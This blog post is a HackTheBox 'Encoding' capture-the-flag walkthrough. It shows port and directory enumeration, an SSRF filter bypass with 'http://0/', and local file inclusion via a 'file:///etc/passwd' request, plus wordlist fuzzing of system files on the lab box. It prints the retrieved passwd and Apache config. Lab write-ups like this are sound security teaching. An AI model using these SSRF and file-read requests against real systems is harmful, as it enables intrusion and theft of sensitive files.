---
title: Encoding HTB Walkthrough
tags: ["htb", "security", "penetration testing", "ctf", "php", "filter", "lfi", "ssrf", "git", "lfi2rce"]
date: 2023-04-15
author: emdwyer
---

![Encoding](./encoding.png)

## Introduction

Another exploitable PHP web app that focuses on character conversions.  We leverage Local File Inclusion (LFI) to further enumerate the system by looking at Apache config files and PHP source.  With some sleuthing, we find work-in-progress code in a git repository -- finding the path to a vulnerable looking PHP script.  Knowing this path is only accessible to localhost, we trace back through an existing LFI and use domain confusion in order to perform Server Side Request Forgery.  With this, we can execute the vulnerable looking PHP script.  From here, we inject a PHP filter chain into the `page` query parameter, which allows us to leverage LFI to include and execute arbitrary PHP code thanks to encoding conversions prepending controllable characters -- setting up a reverse shell.   We privilege escalate to a service account by creating a reverse shell we execute as a `git` filter.  Next, we privilege escalate to root by creating and restarting a systemd unit which spawns a root shell.

## Enumeration

As usual, we start enumerating running services by port scanning with nmap, `-sC` for default scripts and `-sV` to enable version detection:

```bash
$nmap -sC -sV -o nmap/initial 10.10.11.198
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 19:20 AEST
Nmap scan report for 10.10.11.198
Host is up (0.020s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: HaxTables
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.26 seconds
```

Browse to the found web server on http://10.10.11.198/:
![](./assets/2023-04-03-19-21-48-image.png)

In the Convertions (sic) menu, we can select from String, Integer, Numbers.  This presents a form like so:

![](./assets/2023-04-03-19-24-46-image.png)

The API page gives us useful information on the available API calls we can make when hitting http://api.haxtables.htb/ programmatically:

![](./assets/2023-04-03-19-25-54-image.png)

![](./assets/2023-04-03-19-26-24-image.png)

On the string conversions page, we select Base64 encode, enter a string and click Submit -- while intercepting the request in BurpSuite:

![](./assets/2023-04-03-19-29-52-image.png)

```
POST /handler.php HTTP/1.1
Host: 10.10.11.198
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.198/index.php?page=string
Content-Type: application/json;charset=UTF-8
Content-Length: 73
Origin: http://10.10.11.198
DNT: 1
Connection: close

{"action":"b64encode","data":"hello world","uri_path":"/v3/tools/string"}
```

```
HTTP/1.1 200 OK
Date: Mon, 03 Apr 2023 09:29:07 GMT
Server: Apache/2.4.52 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 27
Connection: close
Content-Type: text/html; charset=UTF-8

{"data":"aGVsbG8gd29ybGQ="}
```

Here, I decided to add `10.10.11.198 haxtables.htb api.haxtables.htb` to my `/etc/hosts`

Fuzzing the main host with raft medium from [SecLists](https://github.com/danielmiessler/SecLists), a common wordlist for web directories:

```bash
$ffuf -u "http://haxtables.htb/FUZZ" -w ~/SecLists/Discovery/Web-Content/raft-medium-directories.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://haxtables.htb/FUZZ
 :: Wordlist         : FUZZ: /home/zara/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

includes                [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 27ms]
assets                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 20ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 21ms]
                        [Status: 200, Size: 1999, Words: 246, Lines: 49, Duration: 38ms]
```

Fuzzing `api.haxtables.htb` with the same wordlist:

```bash
$ffuf -u "http://api.haxtables.htb/FUZZ" -w ~/SecLists/Discovery/Web-Content/raft-medium-directories.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://api.haxtables.htb/FUZZ
 :: Wordlist         : FUZZ: /home/zara/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

v2                      [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 20ms]
v3                      [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 19ms]
v1                      [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 24ms]
server-status           [Status: 403, Size: 282, Words: 20, Lines: 10, Duration: 19ms]
                        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
:: Progress: [30000/30000] :: Job [1/1] :: 1761 req/sec :: Duration: [0:00:19] :: Errors: 2 ::
```

So, we have what looks like a versioned API, with versions 1, 2, 3.  We can specify different actions to determine the conversion type, specify a `data` payload directly, or a `file_url` which the server will retrieve to convert.

## Foothold

The `/handler.php` script appears to be a wrapper around the API called from the web interface and we can specify the underlying API to use via the `uri_path`, which we can control (first red flag!).

I tried some payloads with a modified `uri_path` similar to the following:

```
POST /handler.php HTTP/1.1
Host: 10.10.11.198
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.198/index.php?page=string
Content-Type: application/json;charset=UTF-8
Content-Length: 78
Origin: http://10.10.11.198
DNT: 1
Connection: close

{"action":"b64encode","data":"hello world!!!","uri_path":"handler.php"}
```

Each time, the server would hang for 5-10 seconds, before giving an empty HTTP 200 response.

Hitting the URL directly, trying to encode localhost:

```bash
$curl -X POST "http://api.haxtables.htb/v3/tools/string/index.php" -H "Content-Type: application/json" -d '{"action": "b64encode", "file_url": "http://127.0.0.1"}'
{"message":"Unacceptable URL"}%  
```

So there seems to be some filtering to try and stop us from performing Server Side Request Forgery (SSRF).

HackTricks has a list of URL format bypasses: [URL Format Bypass - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass) , and `http://0/` seemed to work:

```bash
$curl -X POST "http://api.haxtables.htb/v3/tools/string/index.php" -H "Content-Type: application/json" -d '{"action": "b64encode", "file_url": "http://0/index.php"}'                         
{"data":"PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+DQogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIj4NCiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQogICAgPHRpdGxlPkhheFRhYmxlczwvdGl0bGU+DQogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPg0KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSI+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC8zLjQuMS9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiPg0KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2FqYXguZ29vZ2xlYXBpcy5jb20vYWpheC9saWJzL2pxdWVyeS8zLjYuMC9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4NCiAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9tYXhjZG4uYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvMy40LjEvanMvYm9vdHN0cmFwLm1pbi5qcyI+PC9zY3JpcHQ+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJhc3NldHMvY3NzL21haW4uY3NzIj4NCiAgICA8c2NyaXB0IHNyYz0iLi9hc3NldHMvanMvbWFpbi5qcyI+PC9zY3JpcHQ+DQoNCjwvaGVhZD4NCjxib2R5Pg0KPGgxIGFsaWduPSJjZW50ZXIiPkhheFRhYmxlczwvaDE+DQo8YnI+PGJyPg0KPGRpdiBjbGFzcz0iY29udGFpbmVyIj4NCjxuYXYgY2xhc3M9Im5hdmJhciBuYXZiYXItaW52ZXJzZSI+DQogIDxkaXYgY2xhc3M9ImNvbnRhaW5lci1mbHVpZCI+DQogICAgPGRpdiBjbGFzcz0ibmF2YmFyLWhlYWRlciI+DQogICAgICA8YSBjbGFzcz0ibmF2YmFyLWJyYW5kIiBocmVmPSIvIj5IYXhUYWJsZXM8L2E+DQogICAgPC9kaXY+DQogICAgPHVsIGNsYXNzPSJuYXYgbmF2YmFyLW5hdiI+DQogICAgICA8bGkgY2xhc3M9ImFjdGl2ZSI+PGEgaHJlZj0iLyI+SG9tZTwvYT48L2xpPg0KICAgICAgPGxpIGNsYXNzPSJkcm9wZG93biI+PGEgY2xhc3M9ImRyb3Bkb3duLXRvZ2dsZSIgZGF0YS10b2dnbGU9ImRyb3Bkb3duIiBocmVmPSIjIj5Db252ZXJ0aW9uczxzcGFuIGNsYXNzPSJjYXJldCI+PC9zcGFuPjwvYT4NCiAgICAgICAgPHVsIGNsYXNzPSJkcm9wZG93bi1tZW51Ij4NCiAgICAgICAgICA8bGk+PGEgaHJlZj0iL2luZGV4LnBocD9wYWdlPXN0cmluZyI+U3RyaW5nPC9hPjwvbGk+DQogICAgICAgICAgPGxpPjxhIGhyZWY9Ii9pbmRleC5waHA\/cGFnZT1pbnRlZ2VyIj5JbnRlZ2VyPC9hPjwvbGk+DQogICAgICAgICAgPGxpPjxhIGhyZWY9Ii9pbmRleC5waHA\/cGFnZT1pbWFnZSI+SW1hZ2VzPC9hPjwvbGk+DQogICAgICAgIDwvdWw+DQogICAgICA8L2xpPg0KICAgICAgPGxpPjxhIGhyZWY9IiMiPkFib3V0IHVzPC9hPjwvbGk+DQogICAgICA8bGk+PGEgaHJlZj0iL2luZGV4LnBocD9wYWdlPWFwaSI+QVBJPC9hPjwvbGk+DQogICAgPC91bD4NCiAgPC9kaXY+DQo8L25hdj4NCg0KPHAgYWxpZ249ImNlbnRlciI+RnJlZSBvbmxpbmUgU3RyaW5nIGFuZCBOdW1iZXIgY29udmVydGVyLiBKdXN0IGxvYWQgeW91ciBpbnB1dCAgYW5kIHRoZXkgd2lsbCBhdXRvbWF0aWNhbGx5IGdldCBjb252ZXJ0ZWQgdG8gc2VsZWN0ZWQgZm9ybWF0LiAgQSBjb2xsZWN0aW9uIG9mIHVzZWZ1bCB1dGlsaXRpZXMgZm9yIHdvcmtpbmcgd2l0aCBTdHJpbmcgYW5kIEludGVnZXIgdmFsdWVzLiBBbGwgYXJlIHNpbXBsZSwgZnJlZSBhbmQgZWFzeSB0byB1c2UuIFRoZXJlIGFyZSBubyBhZHMsIHBvcHVwcyBvciBvdGhlciBnYXJiYWdlITwvcD4NCg0KPHAgYWxpZ249ImNlbnRlciI+DQogICAgPGltZyAgc3JjPSIuLi9hc3NldHMvaW1nL2luZGV4LnBuZyI+DQo8L3A+DQo8L2Rpdj4NCjwvYm9keT4NCjwvaHRtbD4NCg=="}%            
```

I read around on PHP based Local file Inclusion, and found the `file://` URI works:

```bash
$curl "http://api.haxtables.htb/v3/tools/string/index.php" -H "Content-Type: application/json" -d '{"action": "b64encode", "file_url": "file:///etc/passwd"}' | jq -r .data | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2564    0  2507  100    57  57113   1298 --:--:-- --:--:-- --:--:-- 59627
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
svc:x:1000:1000:svc:/home/svc:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

The one interesting user here, apart from root:

```
svc:x:1000:1000:svc:/home/svc:/bin/bash
```

We know the server is Apache 2.4.52 running on Ubuntu, so with this in mind, I searched around for Apache log paths on Ubuntu.  After trying different locations for logs and configuration, I found the root config at `/etc/apache2/apache2.conf`:

```bash
$curl "http://api.haxtables.htb/v3/tools/string/index.php" -H "Content-Type: application/json" -d '{"action": "b64encode", "file_url": "file:///etc/apache2/apache2.conf"}' | jq -r .data | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  9746    0  9675  100    71   210k   1581 --:--:-- --:--:-- --:--:--  216k
# This is the main Apache server configuration file.  It contains the
# configuration directives that give the server its instructions.
# See http://httpd.apache.org/docs/2.4/ for detailed information about
# the directives and /usr/share/doc/apache2/README.Debian about Debian specific
# hints.
#
#
# Summary of how the Apache 2 configuration works in Debian:
# The Apache 2 web server configuration in Debian is quite different to
# upstream's suggested way to configure the web server. This is because Debian's
# default Apache2 installation attempts to make adding and removing modules,
# virtual hosts, and extra configuration directives as flexible as possible, in
# order to make automating the changes and administering the server as easy as
# possible.

# It is split into several files forming the configuration hierarchy outlined
# below, all located in the /etc/apache2/ directory:
#
#    /etc/apache2/
#    |-- apache2.conf
#    |    `--  ports.conf
#    |-- mods-enabled
#    |    |-- *.load
#    |    `-- *.conf
#    |-- conf-enabled
#    |    `-- *.conf
#     `-- sites-enabled
#         `-- *.conf
#
#
# * apache2.conf is the main configuration file (this file). It puts the pieces
#   together by including all remaining configuration files when starting up the
#   web server.
#
# * ports.conf is always included from the main configuration file. It is
#   supposed to determine listening ports for incoming connections which can be
#   customized anytime.
#
# * Configuration files in the mods-enabled/, conf-enabled/ and sites-enabled/
#   directories contain particular configuration snippets which manage modules,
#   global configuration fragments, or virtual host configurations,
#   respectively.
#
#   They are activated by symlinking available configuration files from their
#   respective *-available/ counterparts. These should be managed by using our
#   helpers a2enmod/a2dismod, a2ensite/a2dissite and a2enconf/a2disconf. See
#   their respective man pages for detailed information.
#
# * The binary is called apache2. Due to the use of environment variables, in
#   the default configuration, apache2 needs to be started/stopped with
#   /etc/init.d/apache2 or apache2ctl. Calling /usr/bin/apache2 directly will not
#   work with the default configuration.


# Global configuration
#

#
# ServerRoot: The top of the directory tree under which the server's
# configuration, error, and log files are kept.
#
# NOTE!  If you intend to place this on an NFS (or otherwise network)
# mounted filesystem then please read the Mutex documentation (available
# at <URL:http://httpd.apache.org/docs/2.4/mod/core.html#mutex>);
# you will save yourself a lot of trouble.
#
# Do NOT add a slash at the end of the directory path.
#
#ServerRoot "/etc/apache2"

#
# The accept serialization lock file MUST BE STORED ON A LOCAL DISK.
#
#Mutex file:${APACHE_LOCK_DIR} default

#
# The directory where shm and other runtime files will be stored.
#

DefaultRuntimeDir ${APACHE_RUN_DIR}

#
# PidFile: The file in which the server should record its process
# identification number when it starts.
# This needs to be set in /etc/apache2/envvars
#
PidFile ${APACHE_PID_FILE}

#
# Timeout: The number of seconds before receives and sends time out.
#
Timeout 300

#
# KeepAlive: Whether or not to allow persistent connections (more than
# one request per connection). Set to "Off" to deactivate.
#
KeepAlive On

#
# MaxKeepAliveRequests: The maximum number of requests to allow
# during a persistent connection. Set to 0 to allow an unlimited amount.
# We recommend you leave this number high, for maximum performance.
#
MaxKeepAliveRequests 100

#
# KeepAliveTimeout: Number of seconds to wait for the next request from the
# same client on the same connection.
#
KeepAliveTimeout 5


# These need to be set in /etc/apache2/envvars
User ${APACHE_RUN_USER}
Group ${APACHE_RUN_GROUP}

#
# HostnameLookups: Log the names of clients or just their IP addresses
# e.g., www.apache.org (on) or 204.62.129.132 (off).
# The default is off because it'd be overall better for the net if people
# had to knowingly turn this feature on, since enabling it means that
# each client request will result in AT LEAST one lookup request to the
# nameserver.
#
HostnameLookups Off

# ErrorLog: The location of the error log file.
# If you do not specify an ErrorLog directive within a <VirtualHost>
# container, error messages relating to that virtual host will be
# logged here.  If you *do* define an error logfile for a <VirtualHost>
# container, that host's errors will be logged there and not here.
#
ErrorLog ${APACHE_LOG_DIR}/error.log

#
# LogLevel: Control the severity of messages logged to the error_log.
# Available values: trace8, ..., trace1, debug, info, notice, warn,
# error, crit, alert, emerg.
# It is also possible to configure the log level for particular modules, e.g.
# "LogLevel info ssl:warn"
#
LogLevel warn

# Include module configuration:
IncludeOptional mods-enabled/*.load
IncludeOptional mods-enabled/*.conf

# Include list of ports to listen on
Include ports.conf


# Sets the default security model of the Apache2 HTTPD server. It does
# not allow access to the root filesystem outside of /usr/share and /var/www.
# The former is used by web applications packaged in Debian,
# the latter may be used for local directories served by the web server. If
# your system is serving content from a sub-directory in /srv you must allow
# access here, or in any related virtual host.
<Directory />
    Options FollowSymLinks
    AllowOverride None
    Require all denied
</Directory>

<Directory /usr/share>
    AllowOverride None
    Require all granted
</Directory>

<Directory /var/www/>
    Options Indexes FollowSymLinks
    AllowOverride None
    Require all granted
</Directory>

#<Directory /srv/>
#    Options Indexes FollowSymLinks
#    AllowOverride None
#    Require all granted
#</Directory>




# AccessFileName: The name of the file to look for in each directory
# for additional configuration directives.  See also the AllowOverride
# directive.
#
AccessFileName .htaccess
LimitRequestLine 100000
#
# The following lines prevent .htaccess and .htpasswd files from being
# viewed by Web clients.
#
<FilesMatch "^\.ht">
    Require all denied
</FilesMatch>


#
# The following directives define some format nicknames for use with
# a CustomLog directive.
#
# These deviate from the Common Log Format definitions in that they use %O
# (the actual bytes sent including headers) instead of %b (the size of the
# requested file), because the latter makes it impossible to detect partial
# requests.
#
# Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.
# Use mod_remoteip instead.
#
LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
LogFormat "%h %l %u %t \"%r\" %>s %O" common
LogFormat "%{Referer}i -> %U" referer
LogFormat "%{User-agent}i" agent

# Include of directories ignores editors' and dpkg's backup files,
# see README.Debian for details.

# Include generic snippets of statements
IncludeOptional conf-enabled/*.conf

# Include the virtual host configurations:
IncludeOptional sites-enabled/*.conf

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

To speed things up, I decided to search for LFI wordlists I could run with `ffuf` -- and found the following: 

https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux

We run `ffuf` and filter out responses with size 11 bytes, which gives us valid responses:

```bash
$ffuf -u "http://api.haxtables.htb/v3/tools/string/index.php" -H "Content-Type: application/json" -d '{"action": "b64encode", "file_url": "file://FUZZ"}' -w LFI-WordList-Linux -fs 11

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://api.haxtables.htb/v3/tools/string/index.php
 :: Wordlist         : FUZZ: LFI-WordList-Linux
 :: Header           : Content-Type: application/json
 :: Data             : {"action": "b64encode", "file_url": "file://FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 11
________________________________________________

/etc/apache2/mods-enabled/dir.conf [Status: 200, Size: 223, Words: 1, Lines: 1, Duration: 37ms]
/etc/adduser.conf       [Status: 200, Size: 4051, Words: 1, Lines: 1, Duration: 36ms]
/etc/apache2/ports.conf [Status: 200, Size: 439, Words: 1, Lines: 1, Duration: 41ms]
/etc/apache2/mods-available/proxy.conf [Status: 200, Size: 1107, Words: 1, Lines: 1, Duration: 39ms]
/etc/apache2/apache2.conf [Status: 200, Size: 9675, Words: 1, Lines: 1, Duration: 50ms]
/etc/apache2/mods-available/deflate.conf [Status: 200, Size: 627, Words: 1, Lines: 1, Duration: 53ms]
/etc/apache2/mods-enabled/deflate.conf [Status: 200, Size: 627, Words: 1, Lines: 1, Duration: 57ms]
/etc/apache2/mods-enabled/mime.conf [Status: 200, Size: 10276, Words: 1, Lines: 1, Duration: 58ms]
/etc/apache2/mods-available/autoindex.conf [Status: 200, Size: 4512, Words: 1, Lines: 1, Duration: 63ms]
/etc/apache2/envvars    [Status: 200, Size: 2387, Words: 1, Lines: 1, Duration: 65ms]
/etc/bash.bashrc        [Status: 200, Size: 3104, Words: 1, Lines: 1, Duration: 40ms]
/etc/apache2/mods-available/ssl.conf [Status: 200, Size: 4159, Words: 1, Lines: 1, Duration: 81ms]
/etc/ca-certificates.conf [Status: 200, Size: 7387, Words: 1, Lines: 1, Duration: 30ms]
/etc/apache2/mods-available/setenvif.conf [Status: 200, Size: 1719, Words: 1, Lines: 1, Duration: 94ms]
/etc/apache2/mods-enabled/negotiation.conf [Status: 200, Size: 979, Words: 1, Lines: 1, Duration: 99ms]
/etc/crypttab           [Status: 200, Size: 83, Words: 1, Lines: 1, Duration: 34ms]
/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 1011, Words: 1, Lines: 1, Duration: 99ms]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 1135, Words: 1, Lines: 1, Duration: 102ms]
/etc/apache2/mods-available/mime.conf [Status: 200, Size: 10276, Words: 1, Lines: 1, Duration: 90ms]
/etc/crontab            [Status: 200, Size: 1527, Words: 1, Lines: 1, Duration: 49ms]
/etc/debian_version     [Status: 200, Size: 31, Words: 1, Lines: 1, Duration: 40ms]
/etc/ca-certificates.conf.dpkg-old [Status: 200, Size: 7383, Words: 1, Lines: 1, Duration: 63ms]
/etc/dhcp/dhclient.conf [Status: 200, Size: 1051, Words: 1, Lines: 1, Duration: 38ms]
/etc/default/grub       [Status: 200, Size: 1643, Words: 1, Lines: 1, Duration: 42ms]
/etc/apache2/mods-available/dir.conf [Status: 200, Size: 223, Words: 1, Lines: 1, Duration: 125ms]
/etc/hostname           [Status: 200, Size: 23, Words: 1, Lines: 1, Duration: 27ms]
/etc/debconf.conf       [Status: 200, Size: 3971, Words: 1, Lines: 1, Duration: 60ms]
/etc/deluser.conf       [Status: 200, Size: 819, Words: 1, Lines: 1, Duration: 55ms]
/etc/hosts.allow        [Status: 200, Size: 559, Words: 1, Lines: 1, Duration: 42ms]
/etc/hosts              [Status: 200, Size: 391, Words: 1, Lines: 1, Duration: 44ms]
/etc/hosts.deny         [Status: 200, Size: 959, Words: 1, Lines: 1, Duration: 51ms]
/etc/fuse.conf          [Status: 200, Size: 939, Words: 1, Lines: 1, Duration: 54ms]
/etc/fstab              [Status: 200, Size: 911, Words: 1, Lines: 1, Duration: 73ms]
/etc/group              [Status: 200, Size: 1075, Words: 1, Lines: 1, Duration: 64ms]
/etc/group-             [Status: 200, Size: 1055, Words: 1, Lines: 1, Duration: 72ms]
/etc/issue              [Status: 200, Size: 47, Words: 1, Lines: 1, Duration: 33ms]
/etc/issue.net          [Status: 200, Size: 39, Words: 1, Lines: 1, Duration: 50ms]
/etc/hdparm.conf        [Status: 200, Size: 5927, Words: 1, Lines: 1, Duration: 91ms]
/etc/modules            [Status: 200, Size: 271, Words: 1, Lines: 1, Duration: 34ms]
/etc/logrotate.conf     [Status: 200, Size: 803, Words: 1, Lines: 1, Duration: 47ms]
/etc/ld.so.conf         [Status: 200, Size: 59, Words: 1, Lines: 1, Duration: 57ms]
/etc/ldap/ldap.conf     [Status: 200, Size: 459, Words: 1, Lines: 1, Duration: 61ms]
/etc/host.conf          [Status: 200, Size: 135, Words: 1, Lines: 1, Duration: 106ms]
/etc/login.defs         [Status: 200, Size: 14324, Words: 1, Lines: 1, Duration: 51ms]
/etc/manpath.config     [Status: 200, Size: 6967, Words: 1, Lines: 1, Duration: 54ms]
/etc/pam.conf           [Status: 200, Size: 747, Words: 1, Lines: 1, Duration: 24ms]
/etc/mtab               [Status: 200, Size: 2047, Words: 1, Lines: 1, Duration: 65ms]
/etc/passwd             [Status: 200, Size: 2507, Words: 1, Lines: 1, Duration: 59ms]
/etc/profile            [Status: 200, Size: 787, Words: 1, Lines: 1, Duration: 43ms]
/etc/networks           [Status: 200, Size: 135, Words: 1, Lines: 1, Duration: 81ms]
/etc/security/access.conf [Status: 200, Size: 6099, Words: 1, Lines: 1, Duration: 32ms]
/etc/passwd-            [Status: 200, Size: 2443, Words: 1, Lines: 1, Duration: 93ms]
/etc/os-release         [Status: 200, Size: 527, Words: 1, Lines: 1, Duration: 98ms]
/etc/security/limits.conf [Status: 200, Size: 2895, Words: 1, Lines: 1, Duration: 29ms]
/etc/security/namespace.conf [Status: 200, Size: 2195, Words: 1, Lines: 1, Duration: 29ms]
/etc/security/group.conf [Status: 200, Size: 4859, Words: 1, Lines: 1, Duration: 38ms]
/etc/security/time.conf [Status: 200, Size: 2919, Words: 1, Lines: 1, Duration: 28ms]
/etc/security/pam_env.conf [Status: 200, Size: 3976, Words: 1, Lines: 1, Duration: 33ms]
/etc/sensors3.conf      [Status: 200, Size: 14135, Words: 1, Lines: 1, Duration: 36ms]
/etc/ssh/sshd_config    [Status: 200, Size: 4387, Words: 1, Lines: 1, Duration: 34ms]
/etc/sysctl.d/10-network-security.conf [Status: 200, Size: 223, Words: 1, Lines: 1, Duration: 39ms]
/etc/sysctl.d/10-console-messages.conf [Status: 200, Size: 115, Words: 1, Lines: 1, Duration: 44ms]
/etc/sysctl.conf        [Status: 200, Size: 3151, Words: 1, Lines: 1, Duration: 46ms]
/etc/timezone           [Status: 200, Size: 23, Words: 1, Lines: 1, Duration: 48ms]
/etc/resolv.conf        [Status: 200, Size: 1239, Words: 1, Lines: 1, Duration: 130ms]
/etc/security/sepermit.conf [Status: 200, Size: 571, Words: 1, Lines: 1, Duration: 119ms]
/proc/net/tcp           [Status: 200, Size: 811, Words: 1, Lines: 1, Duration: 24ms]
/proc/cpuinfo           [Status: 200, Size: 3023, Words: 1, Lines: 1, Duration: 29ms]
/proc/net/udp           [Status: 200, Size: 1035, Words: 1, Lines: 1, Duration: 23ms]
/proc/self/cmdline      [Status: 200, Size: 115, Words: 1, Lines: 1, Duration: 34ms]
/proc/meminfo           [Status: 200, Size: 1903, Words: 1, Lines: 1, Duration: 40ms]
/proc/devices           [Status: 200, Size: 831, Words: 1, Lines: 1, Duration: 42ms]
/proc/self/stat         [Status: 200, Size: 431, Words: 1, Lines: 1, Duration: 28ms]
/proc/self/mounts       [Status: 200, Size: 2047, Words: 1, Lines: 1, Duration: 32ms]
